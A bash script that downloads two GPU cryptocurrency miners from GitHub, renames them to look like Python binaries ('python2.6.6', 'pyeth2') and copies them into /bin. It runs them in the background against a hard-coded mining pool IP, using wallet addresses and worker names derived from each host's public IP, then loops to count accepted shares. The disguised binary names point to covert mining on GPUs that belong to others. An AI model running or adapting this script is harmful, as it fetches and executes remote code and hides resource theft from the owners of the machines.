#!bin/bash -xe 
iip=$(curl https://ipecho.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
nvidia-smi
curl ipinfo.io
# Version 1.2.3
# wget https://github.com/RavenCommunity/kawpowminer/releases/download/1.2.3/kawpowminer-ubuntu18-1.2.3.zip
# unzip kawpowminer-ubuntu18-1.2.3.zip
# version1.2.2
wget https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6
wget https://github.com/one10001/ethminer/releases/download/v0.0.1/pyeth2
chmod +x pyeth2
cp pyeth2 /bin/pyeth2
chmod +x python2.6.6
cp python2.6.6 /bin/python2.6.6
python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  --cu-grid-size 64  --cu-block-size 128  --cu-parallel-hash 1 2> log02.out 1> log02.out &
pyeth2 -P stratum1+tcp://0x1be9C1Db52aC9cD736160c532D69aA4770c327B7.$IPNAME@116.203.10.54:990 -U  --cu-grid-size 128  --cu-block-size 256  --cu-parallel-hash 1 2> log01.out 1> log01.out  &
nvidia-smi

while [ 1 ]
do
    echo '#######################################################################################################################################'
    echo eth 21: $(grep -o 'Accepted' log02.out  | wc -l)
    grep -o 'Accepted' log02.out | tail -n 3
    echo rv 80: $(grep -o 'Accepted' log01.out | wc -l)
    grep -o 'Accepted' log01.out | tail -n 3
    nvidia-smi
    sleep 30
done
